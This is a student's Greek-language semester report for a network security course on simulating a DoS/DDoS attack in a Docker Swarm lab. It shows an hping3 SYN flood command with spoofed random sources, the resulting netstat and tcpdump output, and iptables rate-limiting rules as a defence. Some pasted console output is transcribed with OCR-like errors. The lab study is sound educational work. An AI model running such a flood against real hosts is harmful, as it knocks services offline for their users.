~~ Εργασία Εξαμήνου - Ασφαλεία Δικτύων και επικοινωνίων ~~

Μακρογαμβράκης Απόλλων Φοίβος
713242017105

~~ Υλοποίηση συστήματος για την προσομοίωση Dos/DDos Attack ~~

Ένας λιμένας είναι μια πλατφόρμα λογισμικού για τη διαχείριση των εμπορευματοκιβωτίων. 
Η βασική εστίαση του Docker είναι να βοηθήσει τους προγραμματιστές να αναπτύξουν εύκολα εφαρμογές και να τους μεταφέρουν σε ένα κοντέινερ για να τις αναπτύξουν οποιαδήποτε στιγμή.
Επίσης, υπάρχουν διαθέσιμα διάφορα στοιχεία στο Docker. Το Docker για Mac εκτελεί το δοχείο Docker στο Mac OS.
Ομοίως, υπάρχουν εκδόσεις Linux και Windows που επιτρέπουν την εκτέλεση του Docker στις αντίστοιχες πλατφόρμες τους.

~~ Αρχικά ~~

Για την εργασία χρησιμοποιήθηκε εικονική μηχανή (Virtual Machine) σε KVM Virtualization περιβάλλον, με λειτουργικό Debian 11.1 και docker-ce από την επίσημη πλατφόρμα του docker.

~~ Εγκατάσταση Debian 11.1 ~~

Για την εγκατάσταση ακολουθήθηκαν οι εντολές από το https://www.debian.org/ καθώς και κατέβηκε το λειτουργικό από το https://www.debian.org/download.

~~ Εγκατάσταση Docker ~~

Για την εγκατάσταση του Docker ακολουθήθηκαν οι οδηγίες από το https://docs.docker.com/engine/install/debian/

~~ Δημιουργία Docker Swarm ~~

Δημιουργήθηκε docker swarm με ένα node, θα μπορούσαν να είναι και περισσότερα χωρίς να αλλάξει η αρχιτεκτονική δομή.
Για την εγκατάσταση του swarm ακολουθήθηκαν οι εντολές από: https://docs.docker.com/engine/swarm/swarm-tutorial/create-swarm/

~~ Εγκατάσταση swarmlab.io on docker swarm ~~

Για να μπορέσει να γίνει η εγκατάσταση του swarmlab.io στο docker swarm ακολουθήθηκαν οι οδηγίες: http://docs.swarmlab.io/SwarmLab-HowTos/swarmlab/docs/swarmlab/docs/install/install-hybrid.html

~~ Εκτέλεση της εντολής hping3 για syn flood ~~

```bash
sudo hping3 -c 14000 -d 120 -S -w 64 -p 3088 --flood --rand-source 192.168.71.95
```
>> HPING 192.168.71.95 (enp1s0 192.168.71.95): S set, 40 headers + 120 data bytes hping in flood mode, no replies will be shown

~~ Εκτέλεση εντολή netstat ~~

```bash
netstat -s
Ip:
    Forwarding: 1
    6714892 total packets received
    1 with invalid addresses
    6275771 forwarded
    o incoming packets discarded
    438890 incoming packets delivered
    13131741 requests sent out
    17955 outgoing packets dropped
    120 dropped because of missing route
Icmp:
    64 ICMP messages received
    64 input ICMP message failed
    ICMP input histogram:
    destination unreachable: 64
    4 ICMP messages sent
    O ICMP messages failed
    ICMP output histogram:
    destination unreachable: 4
IcmpMsg:
    InType 3: 64
    Out Type 3: 4
Top:
    789 active connection openings
    112 passive connection openings
    19 failed connection attempts
    17 connection resets received
    5 connections established
    438546 segments received
    261770 segments sent out
    172 segments retransmitted
    64 bad segments received
    537 resets sent
Udp:
    1785 packets received
    2 packets to unknown port received
    O packet receive errors
    1870 packets sent
    o receive buffer errors
    O send buffer errors
    IgnoredMulti: 316
UdpLite:
TcpExt:
    398 TCP sockets finished time wait in fast timer
    215 delayed acks sent
    1 delayed acks further delayed because of locked socket
    Quick ack mode was activated 34 times
    317668 packet headers predicted
    7373 acknowledgments not containing data payload received
    23406 predicted acknowledgments
```
~~ Αποτελέσματα κονσόλας από tcpdump μετά την επίθεση με hping3 ~~

```bash
* Applications Vue App - Mozilla Firefox Xfce Terminal
Sun 28 Nov, 11:35 apollon
Terminal - apollon@uniwa: -
File Edit View Terminal Tabs Help
11:35:34.447010 IP 192.168.71.95.3088 > 240.240.85.93.16018: Flags [5.], seq 1550122629, ack 621167861, win 64240, options [mss 1460), length
0
11:35:34.447055 IP 192.168.71.95.3088 > 67.45.101.115. 16019: Flags [5.], seq 3984996027, ack 1611056161, win 64240, options [mss 1460), length
0
11:35:34.447101 IP 192.168.71.95.3088 > 77.235.133. 155.16020: Flags [5.], seq 3611295506, ack 1662272166, win 64240, options [mss 1460), lengt
h 0
11:35:34.447147 IP 192.168.71.95.3088 > 114.101.21.238.16021: Flags [5.], seq 3301958162, ack 238672718, win 64240, options [mss 1460), length
0
11:35:34.447192 IP 192.168.71.95.3088 > 34.235.245.23.16022: Flags [5.], seq 392413623, ack 1421390786, win 64240, options [mss 1460], length
0
11:35:34.447236 IP 192.168.71.95.3088 > 207.235.38.45.16023: Flags [5.], seq 3651039250, ack 1893493400, win 64240, options [mss 1460), length
0
11:35:34.447280 IP 192.168.71.95.3088 > 133.124.239.167.16024: Flags [S.], seq 23158304, ack 1660499813, win 64240, options [mss 1460), length
0
11:35:34.447324 IP 192.168.71.95.3088 > 105.158.165.2.16025: Flags [5.], seq 975114860, ack 51228886, win 64240, options [mss 1460), length o
11:35:34.447367 IP 192.168.71.95.3088 > 195.124.220.231.16026: Flags [5.], seq 1215833312, ack 664586846, win 64240, options [mss 1460], lengt
h 0
11:35:34.447413 IP 192.168.71.95.3088 > 13.142.17.54.16027: Flags [5.], seq 805180224, ack 1861312121, win 64240, options [mss 1460], length 0
11:35:34.447460 IP 192.168.71.95.3088 > 79.177.213.15.16028: Flags [5.], seq 4064525770, ack 301993332, win 64240, options [mss 1460), length
0
11:35:34.447504 IP 192.168.71.95.3088 > 252.251.81.22.16029: Flags [5.], seq 4102469318, ack 403830326, win 64240, options [mss 1460], length
0
11:35:34.447548 IP 192.168.71.95.3088 > 140.107.119.44.16030: Flags [5.], seq 3053884183, ack 837200910, win 64240, options [mss 1460), length
0
11:35:34.447592 IP 192.168.71.95.3088 > 2.158.54.94.16031: Flags [S.], seq 1256834734, ack 950928798, win 64240, options [mss 1460), length 0
11:35:34.447639 IP 192.168.71.95.3088 > 150.114.54.86.16032: Flags [5.], seq 2950004765, ack 1458970226, win 64240, options [mss 1460], length
0
11:35:34.447685 IP 192.168.71.95.3088 > 24.165.68.147.16033: Flags [S.], seq 2305816727, ack 1965974916, win 64240, options [mss 1460], length
0
11:35:34.447731 IP 192.168.71.95.3088 > 162.92.115.199.16034: Flags [5.], seq 2319037900, ack 1197457405, win 64240, options [mss 1460], lengt
h 0
11:35:34.447775 IP 192.168.71.95.3088 > 81.167.191.104.16035: Flags [5.], seq 1267269430, ack 787950879, win 64240, options [mss 1460), length
0
11:35:34.447818 IP 192.168.71.95.3088 > 85.136.182.194.16036: Flags [5.], seq 3624272231, ack 2139232251, win 64240, options [mss 1460], lengt
h 0
11:35:34.447862 IP 192.168.71.95.3088 > 79.225.31.250.16037: Flags [5.], seq 3357781946, ack 663608005, win 64240, options [mss 1460), length
0
11:35:34.447908 IP 192.168.71.95.3088 > 104.240.51.235.16038: Flags [5.], seq 3217381805, ack 1699093393, win 64240, options [mss 1460], lengt
h 0
11:35:34.447953 IP 192.168.71.95.3088 > 49.39.201.19.16039: Flags [S.], seq 2409508332, ack 307638335, win 64240, options [mss 1460), length 0
11:35:34.448020 IP 192.168.71.95.3088 > 252.15.89.6.16041: Flags [S.], seq 2175275946, ack 1924951166, win 64240, options [mss 1460), length 0
11:35:34.448068 IP 192.168.71.95.3088 > 187.19.44.150.16042: Flags [5.], seq 3931418540, ack 851321103, win 64240, options [mss 1460), length
```

~~ Εγκατάσταση datacollector ~~

Για την εγκατάσταση ακολουθούμε τις εντολές~

```bash
mkdir datacollector
cd datacollector
git clone https://git.swarmlab.io:3000/docs/Documentation.git
cd Documentation
./build.sh
```

Τέλος από την κονσόλα μπορούμε να δούμε τα παρακάτω αποτελέσματα:
```bash
===> Build docs
swarmlab-documentation
swarmlab-documentation
Using default tag: latest
latest: Pulling from antora
Digest: sha256:843a767ff93237591635109791d45c2112d7263413925f29d3beb244eab7e331
Status: Image is up to date for hub.swarmlab.io:5480/antora:latest
hub.swarmlab.io:5480/antora:latest
*** On Error ***
Get https://hub.swarmlab.io:5480/v2/: X509: certificate
Pulling -
ERROR: Get https://hub.swarmlab.io:5480/v2/: X509: certificate signed by unknown authority
I
run ***
./0-get-certs.sh
*** WSL2 ***
With Docker Desktop running on WSL 2, users can use: http://127.0.0.1:8080
**********
[clone] https://git.swarmlab.io:3000/docs/Documentation.git [##############################################################]
letho Link encap:Ethernet HWaddr 02:42:AC:11:00:02
inet addr:172.17.0.2 Bcast:172.17.255.255 Mask:255.255.0.0
UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
RX packets : 1752 errors:0 dropped:0 overruns:0 frame: 0
TX packets:1213 errors:0 dropped:0 overruns:0 carrier:0
collisions: 0 txqueuelen: 0
RX bytes:3275768 (3.1 MiB) TX bytes:83739 (81.7 KiB)
lo
Link encap: Local Loopback
inet addr:127.0.0.1 Mask:255.0.0.0
UP LOOPBACK RUNNING MTU:65536 Metric:1
RX packets:0 errors:0 dropped:0 overruns:0 frame: 0
TX packets:0 errors:0 dropped:0 overruns:0 carrier: 0
collisions : 0 txqueuelen: 1000
RX bytes:0 (0.0 B) TX bytes:0 (0.0 B)
Starting up http-server, serving build/site
Available on:
http://127.0.0.1:8080
http://172.17.0.2:8080
Hit CTRL-C to stop the server
```

~~ IP Tables ~~

Για να μπορέσουμε να προστατέψουμε το σύστημα από τέτοιες επιθέσεις μπορούμε να δημιουργήσουμε ip tables ώστε να αντιμετωπίζονται οι επιθέσεις.

>> Πρώτος Τρόπος
```bash
iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j RETURN
All incoming connection are allowed till limit is reached:

–limit 1/s: Maximum average matching rate in seconds
–limit-burst 3: Maximum initial number of packets to match
```

>> Δεύτερος Τρόπος

```bash
# Limit the number of incoming tcp connections
# Interface 0 incoming syn-flood protection
iptables -N syn_flood
iptables -A INPUT -p tcp --syn -j syn_flood
iptables -A syn_flood -m limit --limit 1/s --limit-burst 3 -j RETURN
iptables -A syn_flood -j DROP
#Limiting the incoming icmp ping request:
iptables -A INPUT -p icmp -m limit --limit  1/s --limit-burst 1 -j ACCEPT

iptables -A INPUT -p icmp -m limit --limit 1/s --limit-burst 1 -j LOG --log-prefix PING-DROP:
iptables -A INPUT -p icmp -j DROP

iptables -A OUTPUT -p icmp -j ACCEPT
```
